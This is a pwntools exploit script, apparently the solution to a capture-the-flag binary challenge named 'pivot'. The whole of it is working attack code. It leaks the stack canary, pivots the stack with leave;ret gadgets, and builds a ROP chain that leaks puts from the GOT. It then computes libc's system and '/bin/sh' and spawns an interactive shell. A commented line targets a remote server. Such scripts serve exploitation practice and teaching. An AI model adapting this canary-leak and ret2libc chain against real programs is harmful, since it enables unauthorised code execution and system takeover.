 
# coding=utf-8
from pwn import*
from LibcSearcher import*
sh = process("./pivot_patched")
#sh = remote('43.142.108.3',28809) 
context(log_level = 'debug',arch = 'amd64')
elf = ELF('./pivot')
libc = ELF('./libc.so.6')



s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num                :sh.recv(num)
ru      = lambda delims		    :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))

gdb.attach(sh)
leave = p64(0x401213)
main = p64(0x4011d4)
ret = p64(0x40101a)
rdi = p64(0x401343)
puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])

ru(b'Name:\n')
payload = b'a'*(0x28 + 1)
s(payload)
ru(b'a'*0x28)
canary = u64(r(8)) - 0x61
print('canary',hex(canary))
ru(b'\n')

payload = b'a'*(0x110 - 8) + p64(canary) + p64(0x404f00) + main
s(payload)
ru(b'G00DBYE.\n')

payload = rdi + puts_got + puts_plt + p64(0x4011BA)
payload = payload.ljust(0x108,b'a') + p64(canary) + p64(0x404de8) + leave
s(payload)
leak_addr = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))

libc_base = leak_addr - libc.sym['puts']
system_ = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))


ru(b'\n')
payload = ret + rdi + p64(bin_sh) + p64(system_)
payload = payload.ljust(0x108,b'a') + p64(canary) + p64(0x404cf0) + leave
s(payload)

itr()
